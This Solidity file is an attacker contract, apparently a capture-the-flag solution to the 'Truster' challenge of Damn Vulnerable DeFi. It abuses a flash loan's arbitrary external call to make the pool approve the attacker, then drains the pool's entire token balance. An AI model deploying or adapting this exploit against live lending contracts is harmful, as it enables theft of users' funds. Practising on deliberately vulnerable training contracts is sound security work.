// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./TrusterLenderPool.sol";
import "./TrusterLenderPool.sol";

contract Attacker {
    TrusterLenderPool pool;
    DamnValuableToken token;

    constructor(address _pool, address _token) {
        pool = TrusterLenderPool(_pool);
        token = DamnValuableToken(_token);
    }

    function attack(uint256 amount) public {
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            amount
        );
        pool.flashLoan(amount, address(pool), address(token), data);
    }

    function withdraw() public {
        token.transferFrom(
            address(pool),
            address(this),
            token.balanceOf(address(pool))
        );
    }
}
